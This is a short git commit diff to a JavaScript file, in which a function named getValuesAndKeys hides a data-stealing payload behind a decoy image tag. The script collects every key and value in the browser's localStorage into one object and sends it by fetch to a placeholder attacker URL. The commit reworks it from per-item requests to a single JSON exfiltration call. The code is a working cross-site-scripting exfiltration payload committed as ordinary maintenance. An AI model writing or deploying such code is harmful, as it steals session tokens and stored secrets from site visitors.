f16b3b4d8f0e53fb98cdfdfcdf4b2c23413762f7
Cristóbal Sandoval <devAthete10@gmail.com>
2024-11-15 18:08:42 -0300

    script update JS C-localStorage/F-getValuesAndKeys

--- JS/local-storage.js
+++ JS/local-storage.js
@@ -1,8 +1,9 @@
-function getValuesAndKey() {
+function getValuesAndKeys() {
     document.write(`<img src="${((async() => {
+        let itemsLocalStorage = {};
         for (let i = 0; i < localStorage.length; i++) {
-          await fetch("add-url-attack" +localStorage.key(i)+ "-" +localStorage.getItem(localStorage.key(i)));
+            itemsLocalStorage[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
         } 
-        })() == Object) ? "add-url-img-facade":"add-url-img-facade"}" >`);
+        await fetch("add-url-attack" + JSON.stringify(itemsLocalStorage));
+        })() == Object) ? "add-url-img-facade":"add-url-img-facade"}">`);
  }
- 
